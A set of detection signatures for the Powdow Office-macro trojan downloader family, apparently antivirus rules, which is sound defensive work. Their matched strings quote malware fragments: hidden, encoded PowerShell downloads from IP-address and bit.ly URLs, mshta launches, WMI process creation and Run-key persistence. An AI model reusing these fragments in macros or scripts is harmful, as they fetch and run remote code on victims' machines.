
rule TrojanDownloader_O97M_Powdow_AR_MTB{
	meta:
		description = "TrojanDownloader:O97M/Powdow.AR!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,14 00 14 00 02 00 00 "
		
	strings :
		$a_00_0 = {58 46 42 70 59 33 52 31 63 6d 56 7a 58 47 68 6f 62 6e 70 75 59 6d 4a 6d 59 53 35 6c 65 47 56 39 } //10 XFBpY3R1cmVzXGhobnpuYmJmYS5leGV9
		$a_00_1 = {4c 79 38 78 4f 43 34 78 4f 54 59 75 4d 54 55 33 4c 6a 67 32 4c 31 51 76 4d 7a 41 30 4d 54 41 77 4d 43 35 71 63 47 63 67 } //10 Ly8xOC4xOTYuMTU3Ljg2L1QvMzA0MTAwMC5qcGcg
	condition:
		((#a_00_0  & 1)*10+(#a_00_1  & 1)*10) >=20
 
}
rule TrojanDownloader_O97M_Powdow_AR_MTB_2{
	meta:
		description = "TrojanDownloader:O97M/Powdow.AR!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,0c 00 0c 00 03 00 00 "
		
	strings :
		$a_01_0 = {27 6f 63 69 2e 6e 6f 63 69 76 61 66 2f 31 30 30 39 3a 39 35 2e 38 34 31 2e 30 30 31 2e 38 39 31 2f 2f 3a 70 74 74 68 27 28 65 6c 69 46 64 61 6f 6c 6e 77 6f 44 2e 29 } //10 'oci.nocivaf/1009:95.841.001.891//:ptth'(eliFdaolnwoD.)
		$a_01_1 = {6c 6c 65 68 73 72 65 77 6f 70 20 63 2f 20 65 78 65 2e 64 6d 63 } //1 llehsrewop c/ exe.dmc
		$a_01_2 = {53 74 72 52 65 76 65 72 73 65 28 } //1 StrReverse(
	condition:
		((#a_01_0  & 1)*10+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=12
 
}
rule TrojanDownloader_O97M_Powdow_AR_MTB_3{
	meta:
		description = "TrojanDownloader:O97M/Powdow.AR!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,0b 00 0b 00 02 00 00 "
		
	strings :
		$a_01_0 = {53 68 65 6c 6c 20 22 70 22 20 26 20 22 69 22 20 26 20 22 6e 22 20 26 20 22 67 22 } //1 Shell "p" & "i" & "n" & "g"
		$a_03_1 = {53 68 65 6c 6c 20 53 74 72 52 65 76 65 72 73 65 28 22 90 02 1e 26 20 22 2e 22 20 26 20 22 6a 5c 5c 3a 73 22 20 26 20 22 70 74 74 68 22 90 02 0f 61 22 20 26 20 22 74 22 20 26 20 22 68 22 20 26 20 22 73 22 20 26 20 22 6d 22 20 26 20 22 22 22 22 29 90 00 } //10
	condition:
		((#a_01_0  & 1)*1+(#a_03_1  & 1)*10) >=11
 
}
rule TrojanDownloader_O97M_Powdow_AR_MTB_4{
	meta:
		description = "TrojanDownloader:O97M/Powdow.AR!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
		
	strings :
		$a_01_0 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 57 53 63 72 69 70 74 2e 53 68 65 6c 6c 22 29 } //1 = CreateObject("WScript.Shell")
		$a_01_1 = {2e 52 75 6e 20 22 70 6f 77 65 72 73 68 65 6c 6c 20 2d 53 74 61 20 2d 4e 6f 70 20 2d 57 69 6e 64 6f 77 20 48 69 64 64 65 6e 20 2d 45 6e 63 6f 64 65 64 43 6f 6d 6d 61 6e 64 } //1 .Run "powershell -Sta -Nop -Window Hidden -EncodedCommand
		$a_01_2 = {41 48 41 41 4f 67 41 76 41 43 38 41 4d 51 41 77 41 43 34 41 4f 41 41 75 41 44 41 41 4c 67 41 33 41 44 41 41 4c 77 42 49 41 46 51 41 56 41 42 51 41 47 30 41 62 77 41 75 41 48 41 41 63 77 41 78 41 43 63 41 4b 51 41 3d 22 } //1 AHAAOgAvAC8AMQAwAC4AOAAuADAALgA3ADAALwBIAFQAVABQAG0AbwAuAHAAcwAxACcAKQA="
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=3
 
}
rule TrojanDownloader_O97M_Powdow_AR_MTB_5{
	meta:
		description = "TrojanDownloader:O97M/Powdow.AR!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,1e 00 1e 00 03 00 00 "
		
	strings :
		$a_01_0 = {3d 20 47 65 74 4f 62 6a 65 63 74 28 22 77 69 6e 6d 67 6d 74 73 3a 5c 5c 22 20 26 20 73 74 72 43 6f 6d 70 75 74 65 72 20 26 20 22 5c 72 6f 6f 74 5c 64 65 66 61 75 6c 74 3a 53 74 64 52 65 67 50 72 6f 76 22 29 } //10 = GetObject("winmgmts:\\" & strComputer & "\root\default:StdRegProv")
		$a_01_1 = {53 6f 66 74 77 61 72 65 5c 4d 69 63 72 6f 73 6f 66 74 5c 57 69 6e 64 6f 77 73 5c 43 75 72 72 65 6e 74 56 65 72 73 69 6f 6e 5c 52 75 6e } //10 Software\Microsoft\Windows\CurrentVersion\Run
		$a_01_2 = {3d 20 22 6d 22 20 2b 20 22 73 22 20 2b 20 22 68 22 20 2b 20 22 74 22 20 2b 20 22 61 22 20 2b 20 22 20 22 20 2b 20 22 68 22 20 2b 20 22 74 22 20 2b 20 22 74 22 20 2b 20 22 70 73 3a 5c 5c 62 69 74 2e 6c 79 2f 6f 6a 71 69 6a 79 35 32 66 6c 31 39 61 70 6c 77 34 54 77 } //10 = "m" + "s" + "h" + "t" + "a" + " " + "h" + "t" + "t" + "ps:\\bit.ly/ojqijy52fl19aplw4Tw
	condition:
		((#a_01_0  & 1)*10+(#a_01_1  & 1)*10+(#a_01_2  & 1)*10) >=30
 
}
rule TrojanDownloader_O97M_Powdow_AR_MTB_6{
	meta:
		description = "TrojanDownloader:O97M/Powdow.AR!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,0d 00 0d 00 07 00 00 "
		
	strings :
		$a_01_0 = {70 61 74 68 20 3d 20 45 6e 76 69 72 6f 6e 28 22 55 53 45 52 50 52 4f 46 49 4c 45 22 29 } //1 path = Environ("USERPROFILE")
		$a_03_1 = {70 61 74 68 20 3d 20 70 61 74 68 20 26 20 22 90 02 09 2e 74 78 74 90 00 } //1
		$a_03_2 = {6f 75 74 70 75 74 20 3d 20 53 70 6c 69 74 28 90 02 0f 2c 20 22 26 90 00 } //1
		$a_01_3 = {73 61 76 65 32 66 69 6c 65 20 3d 20 70 61 74 68 } //1 save2file = path
		$a_01_4 = {70 61 74 68 20 3d 20 73 61 76 65 32 66 69 6c 65 28 29 } //1 path = save2file()
		$a_03_5 = {3d 20 22 63 6d 64 20 2f 63 20 63 64 20 2f 64 20 25 55 53 45 52 50 52 4f 46 49 4c 45 25 20 26 26 20 72 65 6e 20 90 02 09 2e 74 78 74 20 90 1b 00 2e 65 78 65 20 26 26 90 02 09 68 74 74 70 3a 2f 2f 90 00 } //10
		$a_03_6 = {3d 20 53 68 65 6c 6c 28 90 02 0f 2c 20 76 62 48 69 64 65 29 90 00 } //1
	condition:
		((#a_01_0  & 1)*1+(#a_03_1  & 1)*1+(#a_03_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1+(#a_03_5  & 1)*10+(#a_03_6  & 1)*1) >=13
 
}
rule TrojanDownloader_O97M_Powdow_AR_MTB_7{
	meta:
		description = "TrojanDownloader:O97M/Powdow.AR!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,15 00 15 00 05 00 00 "
		
	strings :
		$a_01_0 = {6f 75 74 46 69 6c 65 20 3d 20 22 43 3a 5c 70 72 6f 67 72 61 6d 64 61 74 61 5c 38 30 33 64 37 36 30 37 31 2e 61 61 61 22 } //10 outFile = "C:\programdata\803d76071.aaa"
		$a_01_1 = {47 65 74 2d 43 6f 6e 74 65 6e 74 20 2e 5c 38 30 33 64 37 36 30 37 31 2e 61 61 61 3b 24 66 69 6c 65 6e 61 6d 65 20 3d 20 27 63 3a 5c 70 72 6f 67 72 61 6d 64 61 74 61 5c 38 30 33 64 37 36 30 37 31 2e 65 78 65 27 3b 24 62 79 74 65 73 20 3d 20 5b 43 6f 6e 76 65 72 74 5d 3a 3a 46 72 6f 6d 42 61 73 65 36 34 53 74 72 69 6e 67 } //10 Get-Content .\803d76071.aaa;$filename = 'c:\programdata\803d76071.exe';$bytes = [Convert]::FromBase64String
		$a_01_2 = {6f 75 74 46 69 6c 65 20 3d 20 22 43 3a 5c 70 72 6f 67 72 61 6d 64 61 74 61 5c 61 61 61 2e 70 73 31 22 } //10 outFile = "C:\programdata\aaa.ps1"
		$a_01_3 = {65 63 68 6f 7c 73 65 74 20 2f 70 3d 22 22 70 6f 77 65 72 73 68 65 6c 22 22 3e 3e 43 3a 5c 70 72 6f 67 72 61 6d 64 61 74 61 5c } //1 echo|set /p=""powershel"">>C:\programdata\
		$a_01_4 = {53 65 74 20 46 69 6c 65 20 3d 20 66 73 6f 2e 43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 6f 75 74 46 69 6c 65 2c 20 54 72 75 65 29 } //1 Set File = fso.CreateTextFile(outFile, True)
	condition:
		((#a_01_0  & 1)*10+(#a_01_1  & 1)*10+(#a_01_2  & 1)*10+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1) >=21
 
}
rule TrojanDownloader_O97M_Powdow_AR_MTB_8{
	meta:
		description = "TrojanDownloader:O97M/Powdow.AR!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,19 00 19 00 04 00 00 "
		
	strings :
		$a_00_0 = {64 32 6c 75 62 57 64 74 64 48 4d 36 64 32 6c 75 4d 7a 4a 66 55 48 4a 76 59 32 56 7a 63 77 3d 3d } //5 d2lubWdtdHM6d2luMzJfUHJvY2Vzcw==
		$a_00_1 = {63 47 39 33 5a 58 4a 7a 61 47 56 73 62 43 35 6c 65 47 55 67 4c 56 64 70 62 6d 52 76 64 31 4e 30 65 57 78 6c 49 45 68 70 5a 47 52 6c 62 69 41 74 52 58 68 6c 59 33 56 30 61 57 39 75 55 47 39 73 61 57 4e 35 49 45 4a 35 63 47 46 7a 63 79 41 67 4c 57 4e 76 62 57 31 68 62 6d 51 67 49 69 41 6d 49 48 73 67 61 58 64 79 49 47 68 30 64 48 41 36 4c 79 38 } //5 cG93ZXJzaGVsbC5leGUgLVdpbmRvd1N0eWxlIEhpZGRlbiAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAgLWNvbW1hbmQgIiAmIHsgaXdyIGh0dHA6Ly8
		$a_00_2 = {4c 6d 70 77 5a 79 41 74 54 33 56 30 52 6d 6c 73 5a 53 42 44 4f 6c 78 56 63 32 56 79 63 31 78 51 64 57 4a 73 61 57 4e 63 } //10 LmpwZyAtT3V0RmlsZSBDOlxVc2Vyc1xQdWJsaWNc
		$a_03_3 = {4c 6d 56 34 5a 58 30 37 49 43 59 67 65 31 4e 30 59 58 4a 30 4c 56 42 79 62 32 4e 6c 63 33 4d 67 4c 55 5a 70 62 47 56 51 59 58 52 6f 49 43 4a 44 4f 6c 78 56 63 32 56 79 63 31 78 51 64 57 4a 73 61 57 4e 63 55 47 6c 6a 64 48 56 79 5a 58 4e 63 90 02 14 4c 6d 56 34 5a 53 4a 39 49 67 90 00 } //10
	condition:
		((#a_00_0  & 1)*5+(#a_00_1  & 1)*5+(#a_00_2  & 1)*10+(#a_03_3  & 1)*10) >=25
 
}
rule TrojanDownloader_O97M_Powdow_AR_MTB_9{
	meta:
		description = "TrojanDownloader:O97M/Powdow.AR!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,2b 00 2b 00 07 00 00 "
		
	strings :
		$a_01_0 = {22 20 2b 20 5f 0d 0a 22 } //10
		$a_01_1 = {47 65 74 4f 62 6a 65 63 74 28 53 74 72 52 65 76 65 72 73 65 28 22 73 73 22 20 2b 20 22 65 63 22 20 2b 20 22 6f 72 50 5f 22 20 2b 20 22 32 33 6e 69 57 22 20 2b 20 22 3a 32 22 20 2b 20 22 76 6d 69 22 20 2b 20 22 63 5c 74 22 20 2b 20 22 6f 6f 72 3a 22 20 2b 20 22 73 74 6d 22 20 2b 20 22 67 6d 22 20 2b 20 22 6e 22 20 2b 20 22 69 77 22 29 29 } //10 GetObject(StrReverse("ss" + "ec" + "orP_" + "23niW" + ":2" + "vmi" + "c\t" + "oor:" + "stm" + "gm" + "n" + "iw"))
		$a_01_2 = {43 72 65 61 74 65 28 53 74 72 52 65 76 65 72 73 65 28 } //10 Create(StrReverse(
		$a_01_3 = {65 2d 20 6e 65 22 20 2b 20 22 64 64 69 22 20 2b 20 22 68 20 65 6c 79 22 20 2b 20 22 74 73 77 6f 64 6e 22 20 2b 20 22 69 77 2d 20 6c 22 20 2b 20 22 6c 65 68 22 20 2b 20 22 73 72 22 20 2b 20 22 65 22 20 2b 20 22 77 22 20 2b 20 22 6f 70 22 29 2c } //10 e- ne" + "ddi" + "h ely" + "tswodn" + "iw- l" + "leh" + "sr" + "e" + "w" + "op"),
		$a_01_4 = {4d 73 67 42 6f 78 20 28 22 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 22 20 26 } //1 MsgBox ("?????????????????????" &
		$a_01_5 = {43 61 6c 6c 20 46 69 6c 65 50 61 74 68 } //1 Call FilePath
		$a_01_6 = {43 61 6c 6c 20 43 72 65 61 74 65 46 69 6c 65 } //1 Call CreateFile
	condition:
		((#a_01_0  & 1)*10+(#a_01_1  & 1)*10+(#a_01_2  & 1)*10+(#a_01_3  & 1)*10+(#a_01_4  & 1)*1+(#a_01_5  & 1)*1+(#a_01_6  & 1)*1) >=43
 
}